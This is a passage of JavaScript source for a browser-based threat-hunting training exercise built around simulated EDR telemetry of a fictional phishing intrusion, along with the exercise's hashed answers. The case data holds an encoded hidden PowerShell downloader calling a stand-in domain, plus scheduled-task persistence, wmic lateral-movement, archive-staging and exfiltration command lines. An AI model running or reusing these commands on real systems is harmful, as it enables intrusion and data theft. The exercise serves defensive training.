/*
 * Case HX-4471: an in-browser threat-hunting exercise.
 *
 * You are the on-call analyst at a fictional company. An EDR alert fired; work the case with
 * simulated analyst tooling (event hunting, process trees, decoding, intel lookups, pcap stats,
 * ATT&CK mapping) and shell pipes, and answer 13 investigation questions.
 *
 * - Purely client-side. Nothing is executed and nothing is sent anywhere.
 * - Every byte of output is written with textContent (never innerHTML).
 * - All infrastructure is fictional: .example domains and RFC 5737 documentation IPs.
 * - Answers are checked against salted SHA-256 hashes. Reading this file is a valid, if unsporting, solve.
 */
'use strict';

const term = document.getElementById('hx-term');
if (term) {
  const out = document.getElementById('hx-term-output');
  const form = document.getElementById('hx-term-form');
  const input = document.getElementById('hx-term-input');
  const promptEl = document.getElementById('hx-term-prompt');
  const HOST = 'ir-ws01';
  const USER = 'analyst';
  const HOME = '/home/analyst';
  const STORE_KEY = 'hx-case-4471';
  const MAX_LINES = 400;

  /* =========================================================================
     Case data
     ========================================================================= */
  const STAGE_B64 = 'JAB1AD0AJwBoAHQAdABwAHMAOgAvAC8AYwBkAG4ALQB1AHAAZABhAHQAZQBzAC4AZQB4AGEAbQBwAGwAZQAvAGsALwB1AHAAZABhAHQAZQAuAGIAaQBuACcAOwAkAHAAPQAiACQAZQBuAHYAOgBBAFAAUABEAEEAVABBAFwATwBuAGUARAByAGkAdgBlAFMAeQBuAGMAXABvAGQAcwB5AG4AYwAuAGUAeABlACIAOwBHAGUAdAAtAFMAdABhAGcAZQAyACAALQBVAHIAaQAgACQAdQAgAC0ATwB1AHQAIAAkAHAAOwBJAG4AdgBvAGsAZQAtAFMAdABhAGcAZQAyACAALQBQAGEAdABoACAAJABwAA==';
  const DEV_B64 = 'SQBuAHYAbwBrAGUALQBQAGUAcwB0AGUAcgAgAC0AUABhAHQAaAAgAC4AXAB0AGUAcwB0AHMAIAAtAEMASQA7ACAAVwByAGkAdABlAC0ASABvAHMAdAAgACcAYgB1AGkAbABkACAAbwBrACcA';
  const IMPLANT = 'C:\\Users\\a.kowalski\\AppData\\Roaming\\OneDriveSync\\odsync.exe';

  const QUESTIONS = [
    { q: 'Initial access: which email address sent the message that started this?', h: [
      'Every intrusion starts somewhere. The mail gateway logs are in ~/case/logs.',
      'Most of the mail is legitimate. Look for an attachment type that can carry macros: `grep -i docm ~/case/logs/mail.log`.',
      'Compare the sender domain with the real one in ~/case/assets.csv. Lookalikes are the point.'] },
    { q: 'On which host did the malicious macro execute?', h: [
      'The alert that opened this case is in ~/case/alerts/.',
      '`ls` the alerts folder and read the one file there.'] },
    { q: 'Which process spawned the encoded PowerShell on that host? (image name)', h: [
      'The alert payload is missing its parent field. Rebuild the tree yourself.',
      '`proctree fin-ws07` draws the process tree from EDR telemetry.'] },
    { q: 'Decode the PowerShell. Which domain does it pull the second stage from?', h: [
      'Get the full command line: `hunt event=ProcessRollup2 host=fin-ws07 image=powershell.exe --fields cmd`.',
      'PowerShell -enc is Base64 over UTF-16LE. `decode b64 utf16le <blob>`.',
      'One-liner: `hunt event=ProcessRollup2 host=fin-ws07 image=powershell.exe --fields cmd | cut -d" " -f6 | decode b64 utf16le`'] },
    { q: 'What IP address did that domain resolve to?', h: [
      'DNS is in the telemetry. `hunt --schema` lists event types and fields.',
      '`hunt event=DnsRequest domain=cdn-updates.example`'] },
    { q: 'How many distinct hosts resolved that domain?', h: [
      'Stack it instead of counting by eye.',
      '`hunt event=DnsRequest domain=cdn-updates.example --stats host` (or `--fields host | sort | uniq -c`).'] },
    { q: 'What is the name of the scheduled task used for persistence?', h: [
      'Read the children of the implant in the process tree, or hunt for the task event.',
      '`hunt event=ScheduledTaskRegistered`'] },
    { q: 'Which MITRE ATT&CK sub-technique ID describes that persistence?', h: [
      'There is an offline ATT&CK lookup on this workstation.',
      '`mitre scheduled` and pick the sub-technique that matches what schtasks.exe does (not `at`).'] },
    { q: 'Hash the implant and check intel. Which malware family is it?', h: [
      'A copy of the dropped binary was collected into ~/case/evidence.',
      '`sha256sum ~/case/evidence/odsync.exe.bin`, then `intel <hash>`.'] },
    { q: 'What mutex does the implant create? (exact string)', h: [
      "Binaries are not text. `cat` won't help.",
      '`strings ~/case/evidence/odsync.exe.bin | grep -i global`'] },
    { q: 'Which account was used to move laterally to fs01?', h: [
      'Logons are telemetry too. Filter to the file server and network logons (type 3).',
      '`hunt event=UserLogon host=fs01 logon_type=3 --fields time,user,src`. One of these is not like the others: who should never log on from a workstation?'] },
    { q: 'What archive was staged on fs01 for exfiltration? (file name)', h: [
      'Look at what ran on fs01 right after the lateral movement.',
      '`proctree fs01`, or `hunt event=FileWrite host=fs01`.'] },
    { q: 'How many bytes left fs01 for the attacker in the largest conversation?', h: [
      "A packet capture from fs01's uplink was collected into ~/case/evidence.",
      "`tshark -r ~/case/evidence/fs01_egress.pcap -q -z conv,tcp`. Read the A→B bytes for traffic to the attacker's IP."] }
  ];
  const ANSWERS = {
    1: ['5789f6f1166ca5c0c5e44cd3ff3606930ac9d1da9c01bf0ea152c88e7f89a59a'],
    2: ['d9e02d55fe1876a2aa3482bb102dc03e5f55483f28c27b9c7e250e7338f9bd74'],
    3: ['30eb14d633cd33c09dca0aa0fad5b8c7d21960b643b7dca411afd9a8dceab299', 'b5590ee60a8cafc9b2271a61b8a655feb282212697b2e6620c14c78aeeb58792'],
    4: ['98c7ac9bde4583acb3c79a355304bec2cdddca98d2e27a8e4ae58bb0d8a78099'],
    5: ['7fe5e545717554488e16af519fd0c46d596776a165fe70f5a030cf063436eec3'],
    6: ['2b62e8ee795ace9268570e3417c2590c38ad607eca70350902f3268b794efe5e', 'f012ee3ed5a362afa2dea879ab05484222a58326aa622de8dc38bf4f0108b45e'],
    7: ['9fb09495e8c1a80b17cdf9ea934171d6d5d317e820a61ccf10afbff58da2484b'],
    8: ['609a32edfa326d9b8755ff7968ec9abd16123d3ac71bbc3863886e5675deee64'],
    9: ['f48d2b1262e111923beac455a0b91a61984045ea2402697750bfc755498de542'],
    10: ['bdc8438f3f91e10101a47f76ef994c2ddb4377fab3b7f6c3e43ca51594ca1f06'],
    11: ['8cc540c2c52eef26cdb067ec8eba91d7c0ffcda2d6620dac6dbe56ee04d4b913', '9b5f6d470a2e393cf16f391fa865f87236319c50aaff13b5ab9dfa34c4036edd'],
    12: ['e1491afb319d8957d6b4041738ee54f9010afb0e7fbd4b8ca2439be27b9b0505'],
    13: ['0c72ccf2652faf61f60082587ce72e0308ff2ecb48c9aac821f88dd178a18c4e']
  };

  /* ---------- deterministic noise ---------- */
  let seed = 4471;
  const rnd = (n) => { seed = (seed * 1103515245 + 12345) & 0x7fffffff; return seed % n; };
  const pick = (arr) => arr[rnd(arr.length)];
  const T = (h, m, s) => `2026-11-18T${String(h).padStart(2, '0')}:${String(m).padStart(2, '0')}:${String(s).padStart(2, '0')}Z`;
  const randT = (h0, h1) => T(h0 + rnd(h1 - h0), rnd(60), rnd(60));

  const ASSETS = [
    ['host', 'ip', 'owner', 'role'],
    ['fin-ws03', '10.20.1.23', 'm.nowak', 'Finance workstation'],
    ['fin-ws07', '10.20.1.27', 'a.kowalski', 'Finance workstation'],
    ['hr-ws02', '10.20.2.12', 'j.lis', 'HR workstation'],
    ['dev-ws11', '10.20.3.41', 'p.zielinski', 'DevOps workstation (build agent installed)'],
    ['fs01', '10.20.4.15', 'it-ops', 'File server (D:\\Shares)'],
    ['dc01', '10.20.0.10', 'it-ops', 'Domain controller'],
    ['ir-ws01', '10.20.9.5', 'soc', 'This forensic workstation'],
    ['', '', '', ''],
    ['# mail domain: halcyon.example', '', '', ''],
    ['# svc_backup: backup service account, runs on fs01 only (nightly job, logon type 5)', '', '', '']
  ];
  const WS = [['fin-ws03', 'm.nowak'], ['fin-ws07', 'a.kowalski'], ['hr-ws02', 'j.lis'], ['dev-ws11', 'p.zielinski']];

  const buildEvents = () => {
    const ev = [];
    const add = (o) => ev.push(o);
    const benignIp = { 'login.microsoftonline.com': '198.51.100.20', 'outlook.office365.com': '198.51.100.31', 'teams.microsoft.com': '198.51.100.44',
      'intranet.halcyon.example': '10.20.0.80', 'ocsp.digicert.com': '198.51.100.67', 'update.googleapis.com': '198.51.100.90',
      'github.com': '198.51.100.112', 'pypi.org': '198.51.100.140', 'slack.com': '198.51.100.155', 'fonts.gstatic.com': '198.51.100.171', 'halcyon.example': '10.20.0.80' };
    const benignDomains = Object.keys(benignIp);

    // Baseline: every workstation starts a user session with ordinary processes.
    WS.forEach(([host, user], w) => {
      const exp = 4000 + 120 * (w + 1);
      add({ time: T(8, rnd(10), rnd(60)), host, user, event: 'UserLogon', logon_type: 2, src: host });
      add({ time: T(8, 10, rnd(60)), host, user, event: 'ProcessRollup2', pid: exp, ppid: 612, image: 'explorer.exe', cmd: 'C:\\Windows\\explorer.exe' });
      const apps = host === 'dev-ws11'
        ? [['code.exe', '"C:\\Program Files\\Microsoft VS Code\\Code.exe"'], ['chrome.exe', '"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe"'], ['teams.exe', 'ms-teams.exe']]
        : [['outlook.exe', '"C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE"'], ['chrome.exe', '"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe"'], ['teams.exe', 'ms-teams.exe']];
      apps.forEach(([image, cmd], i) => add({ time: T(8, 12 + i * 3 + rnd(3), rnd(60)), host, user, event: 'ProcessRollup2', pid: exp + 10 + i * 7, ppid: exp, image, cmd }));
      add({ time: T(8, 20 + rnd(30), rnd(60)), host: 'dc01', user, event: 'UserLogon', logon_type: 3, src: host });
    });
    // Normal file-share use, so "who touched fs01" isn't trivially answered.
    add({ time: T(8, 31, 12), host: 'fs01', user: 'a.kowalski', event: 'UserLogon', logon_type: 3, src: 'fin-ws07' });
    add({ time: T(8, 47, 55), host: 'fs01', user: 'm.nowak', event: 'UserLogon', logon_type: 3, src: 'fin-ws03' });
    add({ time: T(9, 52, 3), host: 'fs01', user: 'j.lis', event: 'UserLogon', logon_type: 3, src: 'hr-ws02' });
    add({ time: T(8, 0, 1), host: 'fs01', user: 'SYSTEM', event: 'ProcessRollup2', pid: 600, ppid: 4, image: 'services.exe', cmd: 'C:\\Windows\\system32\\services.exe' });
    add({ time: T(8, 0, 9), host: 'fs01', user: 'SYSTEM', event: 'ProcessRollup2', pid: 2210, ppid: 600, image: 'wmiprvse.exe', cmd: 'C:\\Windows\\system32\\wbem\\wmiprvse.exe -secured -Embedding' });
    add({ time: T(8, 0, 2), host: 'dc01', user: 'SYSTEM', event: 'ProcessRollup2', pid: 640, ppid: 4, image: 'lsass.exe', cmd: 'C:\\Windows\\system32\\lsass.exe' });

    // DevOps red herring: an encoded PowerShell that is perfectly fine.
    add({ time: T(9, 3, 40), host: 'dev-ws11', user: 'p.zielinski', event: 'ProcessRollup2', pid: 7302, ppid: 4130, image: 'Agent.Worker.exe', cmd: '"C:\\agent\\bin\\Agent.Worker.exe" spawnclient 3412 3420' });
    add({ time: T(9, 3, 41), host: 'dev-ws11', user: 'p.zielinski', event: 'ProcessRollup2', pid: 7310, ppid: 7302, image: 'powershell.exe', cmd: `powershell.exe -NoProfile -NonInteractive -enc ${DEV_B64}` });

    // Background DNS from everyone.
    for (let i = 0; i < 260; i++) {
      const [host, user] = pick(WS.concat([['fs01', 'SYSTEM'], ['dc01', 'SYSTEM']]));
      const domain = pick(benignDomains);
      add({ time: randT(8, 11), host, user, event: 'DnsRequest', domain, ip: benignIp[domain] });
    }
    // Background file writes.
    const docs = ['~WRL0003.tmp', 'report_draft.docx', 'budget_v3.xlsx', 'notes.txt', 'meeting.ics', 'Invoice_88190.pdf'];
    for (let i = 0; i < 40; i++) {
      const [host, user] = pick(WS);
      add({ time: randT(8, 11), host, user, event: 'FileWrite', image: pick(['outlook.exe', 'chrome.exe', 'excel.exe', 'winword.exe']), file: `C:\\Users\\${user}\\Documents\\${pick(docs)}` });
    }

    // ---- The intrusion ----
    const k = { host: 'fin-ws07', user: 'a.kowalski' };
    const outlookPid = 4000 + 120 * 2 + 10;
    add({ ...k, time: T(9, 14, 31), event: 'ProcessRollup2', pid: 5532, ppid: outlookPid, image: 'winword.exe', cmd: '"C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE" /n "C:\\Users\\a.kowalski\\AppData\\Local\\Microsoft\\Windows\\INetCache\\Content.Outlook\\Q2M7\\Invoice_88213.docm"' });
    add({ ...k, time: T(9, 14, 39), event: 'ProcessRollup2', pid: 6120, ppid: 5532, image: 'powershell.exe', cmd: `powershell.exe -nop -w hidden -enc ${STAGE_B64}` });
    add({ ...k, time: T(9, 14, 40), event: 'DnsRequest', domain: 'cdn-updates.example', ip: '203.0.113.66' });
    add({ ...k, time: T(9, 14, 42), event: 'NetworkConnect', image: 'powershell.exe', ip: '203.0.113.66', port: 443 });
    add({ ...k, time: T(9, 14, 47), event: 'FileWrite', image: 'powershell.exe', file: IMPLANT });
    add({ ...k, time: T(9, 14, 50), event: 'ProcessRollup2', pid: 6388, ppid: 6120, image: 'odsync.exe', cmd: `"${IMPLANT}"` });
    add({ ...k, time: T(9, 15, 10), event: 'ProcessRollup2', pid: 6410, ppid: 6388, image: 'schtasks.exe', cmd: `schtasks.exe /create /tn "OneDriveSyncHelper" /tr "${IMPLANT}" /sc onlogon /rl highest /f` });
    add({ ...k, time: T(9, 15, 11), event: 'ScheduledTaskRegistered', image: 'schtasks.exe', task: 'OneDriveSyncHelper', file: IMPLANT });
    for (let m = 20; m <= 59; m += 5) { add({ ...k, time: T(9, m, 3 + rnd(9)), event: 'NetworkConnect', image: 'odsync.exe', ip: '203.0.113.66', port: 8443 }); }
    add({ ...k, time: T(9, 31, 2), event: 'ProcessRollup2', pid: 6502, ppid: 6388, image: 'whoami.exe', cmd: 'whoami /groups' });
    add({ ...k, time: T(9, 31, 9), event: 'ProcessRollup2', pid: 6511, ppid: 6388, image: 'nltest.exe', cmd: 'nltest /dclist:halcyon' });
    add({ ...k, time: T(9, 44, 30), event: 'ProcessRollup2', pid: 6577, ppid: 6388, image: 'net.exe', cmd: 'net view \\\\fs01' });
    add({ ...k, time: T(10, 1, 52), event: 'ProcessRollup2', pid: 6600, ppid: 6388, image: 'wmic.exe', cmd: 'wmic /node:fs01 process call create "cmd.exe /c C:\\ProgramData\\run.cmd"' });
    // Other recipients of the lure resolved the domain too.
    add({ host: 'fin-ws03', user: 'm.nowak', time: T(9, 21, 12), event: 'DnsRequest', domain: 'cdn-updates.example', ip: '203.0.113.66' });
    add({ host: 'hr-ws02', user: 'j.lis', time: T(9, 40, 5), event: 'DnsRequest', domain: 'cdn-updates.example', ip: '203.0.113.66' });

    // Lateral movement and staging on fs01.
    add({ time: T(10, 1, 49), host: 'fs01', user: 'administrator', event: 'UserLogonFailed', logon_type: 3, src: 'fin-ws07' });
    add({ time: T(10, 2, 17), host: 'fs01', user: 'svc_backup', event: 'UserLogon', logon_type: 3, src: 'fin-ws07' });
    add({ time: T(10, 2, 18), host: 'fs01', user: 'svc_backup', event: 'ProcessRollup2', pid: 3302, ppid: 2210, image: 'cmd.exe', cmd: 'cmd.exe /c C:\\ProgramData\\run.cmd' });
    add({ time: T(10, 2, 20), host: 'fs01', user: 'svc_backup', event: 'FileWrite', image: 'cmd.exe', file: 'C:\\ProgramData\\odsync.exe' });
    add({ time: T(10, 5, 40), host: 'fs01', user: 'svc_backup', event: 'ProcessRollup2', pid: 3310, ppid: 3302, image: '7z.exe', cmd: 'C:\\ProgramData\\7z.exe a -mx9 -p**** C:\\ProgramData\\Q3_forecast.7z D:\\Shares\\Finance\\Q3\\*' });
    add({ time: T(10, 5, 58), host: 'fs01', user: 'svc_backup', event: 'FileWrite', image: '7z.exe', file: 'C:\\ProgramData\\Q3_forecast.7z' });
    add({ time: T(10, 6, 55), host: 'fs01', user: 'svc_backup', event: 'ProcessRollup2', pid: 3400, ppid: 3302, image: 'odsync.exe', cmd: 'C:\\ProgramData\\odsync.exe --push C:\\ProgramData\\Q3_forecast.7z' });
    add({ time: T(10, 7, 12), host: 'fs01', user: 'svc_backup', event: 'NetworkConnect', image: 'odsync.exe', ip: '203.0.113.66', port: 8443 });
    add({ time: T(10, 8, 1), host: 'fs01', user: 'svc_backup', event: 'FileDelete', image: 'cmd.exe', file: 'C:\\ProgramData\\Q3_forecast.7z' });

    ev.sort((a, b) => (a.time < b.time ? -1 : a.time > b.time ? 1 : 0));
    return ev;
  };
  const EVENTS = buildEvents();
  const FIELD_ORDER = ['time', 'host', 'user', 'event', 'image', 'pid', 'ppid', 'cmd', 'domain', 'ip', 'port', 'file', 'task', 'logon_type', 'src'];

  const mailLog = () => {
    const rows = [];
    const subjects = { 'newsletter@vendor.example': 'Your weekly digest', 'noreply@github.example': '[halcyon/infra] PR #212 merged',
      'it-helpdesk@halcyon.example': 'Planned maintenance Saturday', 'invoice@halcyon.example': 'Invoice 88190 (paid)',
      'events@conference.example': 'Your badge for SecCon', 'hr@halcyon.example': 'Benefits enrolment closes Friday', 'alerts@bank.example': 'Statement available' };
    const senders = Object.keys(subjects);
    for (let i = 0; i < 70; i++) {
      const from = pick(senders);
      const [, user] = pick(WS);
      const attach = from === 'invoice@halcyon.example' ? 'Invoice_88190.pdf' : from === 'hr@halcyon.example' ? 'Benefits_2027.pdf' : 'none';
      rows.push([randT(7, 11), `from=<${from}> to=<${user}@halcyon.example> subject="${subjects[from]}" attach=${attach} verdict=clean`]);
    }
    for (const user of ['a.kowalski', 'm.nowak', 'j.lis']) {
      rows.push([T(9, 12, 4 + rnd(3)), `from=<invoice@halcyon-billing.example> to=<${user}@halcyon.example> subject="Overdue invoice #88213 - action required" attach=Invoice_88213.docm verdict=delivered score=4.1`]);
    }
    rows.sort((a, b) => (a[0] < b[0] ? -1 : 1));
    return rows.map(([t, l]) => `${t} mx01 postfix/smtpd: ${l}`).join('\n');
  };

  const IMPLANT_BIN = [
    '!This program cannot be run in DOS mode.', '.text', '`.rdata', '@.data', '.reloc', 'Rich', 'KERNEL32.dll', 'WINHTTP.dll', 'ADVAPI32.dll',
    'CreateMutexW', 'WinHttpOpen', 'WinHttpSendRequest', 'RegOpenKeyExW', 'GetComputerNameW', 'Sleep',
    'q8!', 'Zr#', '\u0001\u0002', 'Global\\rf_lowtide_7731', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) ReefSync/2.1',
    '203.0.113.66:8443', '/k/beacon', '/k/push', 'odsync.exe', 'OneDriveSyncHelper', '--push', 'cfg.v=2.1.4', '3$a', 'xx',
    'build 2026-11-03', 'GCC: (GNU) 13.2.0'
  ].join('\u0000\u0000');

  const PCAP = {
    pcap: true,
    convs: [
      ['10.20.4.15:49822', '203.0.113.66:8443', 34102, 50544640, 1203320, '41.23'],
      ['10.20.4.15:49650', '198.51.100.31:443', 1810, 330221, 1203911, '120.04'],
      ['10.20.4.15:49790', '10.20.0.10:445', 212, 18233, 22110, '3.11'],
      ['10.20.4.15:49811', '203.0.113.66:8443', 22, 2210, 880, '0.48'],
      ['10.20.4.15:49702', '198.51.100.67:80', 14, 1530, 4410, '0.21']
    ]
  };

  const INTEL = {
    'cdn-updates.example': 'Domain cdn-updates.example\n  Registered: 2026-11-02 via privacy proxy\n  Resolves:   203.0.113.66\n  Seen in:    "Low Tide" invoice-themed phishing campaign\n  Verdict:    MALICIOUS (payload delivery)',
    '203.0.113.66': 'IP 203.0.113.66\n  ASN:        AS64500 (Bullet Host Ltd, offshore VPS)\n  Open ports: 443, 8443\n  Associated: cdn-updates.example\n  Verdict:    MALICIOUS (C2)',
    'halcyon-billing.example': 'Domain halcyon-billing.example\n  Registered: 2026-11-10\n  Note:       lookalike of halcyon.example (typosquat)\n  Verdict:    SUSPICIOUS',
    'invoice@halcyon-billing.example': 'Sender invoice@halcyon-billing.example\n  SPF: none   DKIM: none   DMARC: fail\n  Verdict: SUSPICIOUS (lookalike domain)',
    'halcyon.example': "Domain halcyon.example\n  Owner: Halcyon Labs (that's us)\n  Verdict: BENIGN"
  };
  const MITRE = [
    ['T1566.001', 'Phishing: Spearphishing Attachment', 'Initial Access'],
    ['T1204.002', 'User Execution: Malicious File', 'Execution'],
    ['T1059.001', 'Command and Scripting Interpreter: PowerShell', 'Execution'],
    ['T1027', 'Obfuscated Files or Information', 'Defense Evasion'],
    ['T1053', 'Scheduled Task/Job', 'Execution, Persistence, Privilege Escalation'],
    ['T1053.002', 'Scheduled Task/Job: At', 'Execution, Persistence, Privilege Escalation'],
    ['T1053.005', 'Scheduled Task/Job: Scheduled Task', 'Execution, Persistence, Privilege Escalation'],
    ['T1547.001', 'Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder', 'Persistence, Privilege Escalation'],
    ['T1033', 'System Owner/User Discovery', 'Discovery'],
    ['T1482', 'Domain Trust Discovery', 'Discovery'],
    ['T1135', 'Network Share Discovery', 'Discovery'],
    ['T1078.002', 'Valid Accounts: Domain Accounts', 'Defense Evasion, Persistence, Privilege Escalation, Initial Access'],
    ['T1047', 'Windows Management Instrumentation', 'Execution'],
    ['T1560.001', 'Archive Collected Data: Archive via Utility', 'Collection'],
    ['T1071.001', 'Application Layer Protocol: Web Protocols', 'Command and Control'],
    ['T1041', 'Exfiltration Over C2 Channel', 'Exfiltration'],
    ['T1070.004', 'Indicator Removal: File Deletion', 'Defense Evasion']
  ];

  /* ---------- virtual filesystem ---------- */
  const F = (content, opts = {}) => Object.assign({ type: 'file', content }, opts);
  const D = (children) => ({ type: 'dir', children });
  const fs = D({
    home: D({
      analyst: D({
        'README.txt': F(
`CASE HX-4471 · Halcyon Labs SOC · on call: you

An EDR alert fired on a finance workstation this morning. Work it like a real
case: find the way in, what ran, how it stays, where it went, what it took.

  questions           the 13 questions this case must answer
  answer <n> <value>  submit an answer          hint <n>   get a nudge
  progress            your case status          report     timeline (once solved)

Your toolkit (type 'help' for everything):
  hunt      query EDR telemetry       proctree  draw a host's process tree
  decode    base64 / utf16le / hex    strings   printable strings in a binary
  sha256sum hash a file               intel     offline threat-intel lookup
  tshark    pcap conversation stats   mitre     offline ATT&CK lookup
  + grep, head, tail, sort, uniq, cut, wc, and pipes (|)

Start: cat case/TICKET-4471.txt`),
        '.bash_history': F(
`# previous shift, kept for reference
hunt --schema
hunt event=DnsRequest host=dc01 --stats domain | head
proctree dc01
hunt event=UserLogon host=dc01 --fields time,user,src | sort | uniq -c
intel 198.51.100.20
mitre phishing`),
        case: D({
          'TICKET-4471.txt': F(
`TICKET-4471  ·  P2  ·  opened 2026-11-18 09:16 UTC
From: SOC lead
To:   on-call analyst

EDR flagged encoded PowerShell on a finance workstation (alert attached in
alerts/). Treat it as real until proven otherwise.

I need answers, not guesses:
  - how did they get in, and who else got the lure
  - what ran, and what it talked to
  - how it survives a reboot
  - did it spread, and with which account
  - did anything leave the building

Telemetry: 'hunt' (EDR events for all hosts, 08:00-11:00 UTC).
Evidence:  evidence/ (implant copy, fs01 egress pcap). Logs: logs/.
Assets:    assets.csv. The case questions: 'questions'.`),
          'assets.csv': F(ASSETS.map((r) => r.join(',')).join('\n').replace(/,+$/gm, '')),
          alerts: D({
            'ALRT-20261118-0914.txt': F(
`ALERT ALRT-20261118-0914                              severity: HIGH
detected:   2026-11-18T09:14:39Z
host:       fin-ws07            user: HALCYON\\a.kowalski
technique:  T1059.001 Command and Scripting Interpreter: PowerShell
process:    powershell.exe (pid 6120)
cmdline:    powershell.exe -nop -w hidden -enc JAB1AD0AJwBoAHQAdABwAHMAOgAvAC8A... [truncated]
parent:     <field missing from payload>
action:     none (detect only)
note:       auto-escalated to on call`)
          }),
          logs: D({ 'mail.log': F(mailLog) }),
          evidence: D({
            'odsync.exe.bin': F(IMPLANT_BIN, { binary: true }),
            'fs01_egress.pcap': F(PCAP, { binary: true }),
            'CHAIN_OF_CUSTODY.txt': F('odsync.exe.bin     collected from fin-ws07 by EDR file retrieval, 2026-11-18 09:48 UTC\nfs01_egress.pcap   span-port capture at the fs01 uplink, 09:55-10:15 UTC')
          })
        })
      })
    }),
    etc: D({ hostname: F(HOST), motd: F('Halcyon Labs SOC forensic workstation. Authorized use only.') }),
    tmp: D({})
  });

  /* =========================================================================
     Engine
     ========================================================================= */
  let cwd = HOME;
  const history = []; let hIdx = 0;
  let solved = new Set();
  try { solved = new Set(JSON.parse(localStorage.getItem(STORE_KEY) || '[]')); } catch (e) { /* storage blocked: progress won't persist */ }
  const save = () => { try { localStorage.setItem(STORE_KEY, JSON.stringify([...solved])); } catch (e) { /* ignore */ } };
  const hintLevel = {};

  const print = (text = '', cls) => {
    const line = document.createElement('div');
    line.className = 'hx-term__line' + (cls ? ' ' + cls : '');
    line.textContent = String(text).replace(/\u0000/g, '·');
    out.appendChild(line);
  };
  const short = (p) => (p === HOME ? '~' : p.startsWith(HOME + '/') ? '~' + p.slice(HOME.length) : p);
  const setPrompt = () => { promptEl.textContent = `${USER}@${HOST}:${short(cwd)}$`; };
  const resolve = (p) => {
    if (!p || p === '~') { return HOME; }
    if (p.startsWith('~/')) { p = HOME + p.slice(1); }
    const stack = [];
    for (const part of (p.startsWith('/') ? p : cwd + '/' + p).split('/')) {
      if (!part || part === '.') { continue; }
      if (part === '..') { stack.pop(); } else { stack.push(part); }
    }
    return '/' + stack.join('/');
  };
  const node = (abs) => {
    let n = fs;
    for (const part of abs.split('/').filter(Boolean)) {
      if (n.type !== 'dir' || !n.children[part]) { return null; }
      n = n.children[part];
    }
    return n;
  };
  const read = (n) => { if (typeof n.content === 'function') { n.content = n.content(); } return n.content; };
  const escRe = (s) => s.replace(/[.+?^${}()|[\]\\]/g, '\\$&');
  // Expand a "*" glob in the last path segment (e.g. alerts/*).
  const glob = (arg) => {
    if (!arg.includes('*')) { return [arg]; }
    const slash = arg.lastIndexOf('/');
    const dir = slash >= 0 ? arg.slice(0, slash) : '.';
    const re = new RegExp('^' + escRe(arg.slice(slash + 1)).replace(/\*/g, '.*') + '$');
    const n = node(resolve(dir));
    if (!n || n.type !== 'dir') { return [arg]; }
    const m = Object.keys(n.children).filter((k) => re.test(k) && !k.startsWith('.')).sort();
    return m.length ? m.map((k) => (slash >= 0 ? dir + '/' : '') + k) : [arg];
  };
  const sha256 = async (s) => {
    const buf = await crypto.subtle.digest('SHA-256', new TextEncoder().encode(s));
    return [...new Uint8Array(buf)].map((b) => b.toString(16).padStart(2, '0')).join('');
  };
  // The intel record for the implant is keyed by its real SHA-256, computed once at startup.
  sha256(IMPLANT_BIN).then((h) => {
    INTEL[h] = `SHA-256 ${h}\n  Family:     ReefLoader (loader / backdoor)\n  First seen: 2026-11-04\n  Behaviour:  HTTPS C2 on 8443, scheduled-task persistence,\n              archive-and-push exfiltration module (--push)\n  Campaign:   "Low Tide"\n  Verdict:    MALICIOUS`;
  }).catch(() => { /* crypto.subtle unavailable (non-secure context) */ });
  const norm = (s) => s.trim().toLowerCase().replace(/[[\]"'`,]/g, '').replace(/\s+/g, ' ').replace(/\.+$/, '');

  // Tokenise a command line: quotes group words, `|` splits stages (outside quotes).
  const parse = (line) => {
    const stages = [[]]; let cur = ''; let quote = null; let has = false;
    const push = () => { if (has) { stages[stages.length - 1].push(cur); } cur = ''; has = false; };
    for (const ch of line) {
      if (quote) { if (ch === quote) { quote = null; } else { cur += ch; } continue; }
      if (ch === '"' || ch === "'") { quote = ch; has = true; continue; }
      if (ch === '|') { push(); stages.push([]); continue; }
      if (/\s/.test(ch)) { push(); continue; }
      cur += ch; has = true;
    }
    if (quote) { return { error: 'unterminated quote' }; }
    push();
    return { stages };
  };

  // Read file arguments, or fall back to stdin.
  const inputText = (files, io, name) => {
    if (!files.length) {
      if (io.stdin == null) { io.err(`${name}: no input (give a file or pipe something in)`); return null; }
      return io.stdin;
    }
    const parts = [];
    for (const f of files.flatMap(glob)) {
      const n = node(resolve(f));
      if (!n) { io.err(`${name}: ${f}: No such file or directory`); continue; }
      if (n.type === 'dir') { io.err(`${name}: ${f}: Is a directory`); continue; }
      if (n.binary && name !== 'strings') { io.err(`${name}: ${f}: binary file (try strings, file or tshark)`); continue; }
      parts.push(read(n));
    }
    return parts.length ? parts.join('\n') : null;
  };
  const lines = (s) => (s === '' ? [] : s.replace(/\n$/, '').split('\n'));
  const opt = (args, name) => { const i = args.indexOf(name); if (i === -1) { return null; } const v = args[i + 1]; args.splice(i, 2); return v; };

  const fmtEvent = (e) => FIELD_ORDER.filter((f) => e[f] !== undefined && f !== 'time' && f !== 'host' && f !== 'event')
    .reduce((s, f) => s + ` ${f}=${e[f]}`, `${e.time}  ${e.host.padEnd(9)} ${e.event.padEnd(23)}`);

  /* ---------- commands: (args, io) → io.out / io.ok / io.err ---------- */
  const cmds = {
    help: (a, io) => io.out(
`Case:      questions · answer <n> <value> · hint <n> · progress · report · reset
Files:     ls [-la] [path] · cd · pwd · cat · head [-n N] · tail [-n N] · file <f>
Text:      grep [-i -v -c -E] <pat> [file] · sort [-n -r -u] · uniq [-c] · wc [-l]
           cut -d<c> -f<n[,m]> · tr <set1> <set2> · echo
Hunting:   hunt <field=value ...> [--fields a,b] [--stats field] [--limit N]
           hunt --schema            event types, fields and syntax
           proctree <host>          process tree from EDR telemetry
           decode <ops...> [text]   ops: b64 utf16le hex rot13 url rev (chainable)
           strings <file> · sha256sum <file> · intel <ioc> · mitre <id|keyword>
           tshark -r <pcap> [-q -z conv,tcp]
Shell:     pipes with |  ·  quotes with "..." or '...'  ·  Tab completes  ·  ↑/↓ history
           clear · history · whoami · exit`),
    ls: (args, io) => {
      const all = args.some((a) => /^-\w*a/.test(a));
      const long = args.some((a) => /^-\w*l/.test(a));
      const target = args.find((a) => !a.startsWith('-'));
      const abs = resolve(target || cwd);
      const n = node(abs);
      if (!n) { return io.err(`ls: cannot access '${target}': No such file or directory`); }
